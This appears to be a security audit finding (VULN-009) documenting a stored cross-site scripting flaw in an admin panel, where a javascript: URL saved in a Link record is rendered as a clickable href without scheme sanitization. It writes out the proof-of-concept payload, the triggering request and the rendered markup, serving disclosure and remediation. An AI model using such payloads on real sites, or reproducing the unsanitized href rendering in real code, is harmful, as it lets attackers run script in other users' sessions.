### VULN-009 — the stored javascript: href. Full capture in response.txt / evidence/*.png.
### Attacker stores a Link whose url is a javascript: payload; PostResource's Links relation
### renders TextColumn::make('url')->url(fn($state)=>$state) via generate_href_html(), which
### e()-escapes but does NOT scheme-sanitize.

### 1) Stored attacker value (Link.url) — representative row:
###    url = javascript:document.title='PWNED-<suffix>'

### 2) Viewer loads the post's Links table (authenticated):
GET /admin/posts/1/edit  → (open "Links" relation tab)
### Server-emitted markup (read from the live DOM):
###    <a href="javascript:document.title='PWNED-<suffix>'" target="_blank" ...>clickme-<suffix></a>

### 3) Viewer clicks the link → the javascript: executes in their session:
###    document.title becomes "PWNED-<suffix>"   (proof of execution)
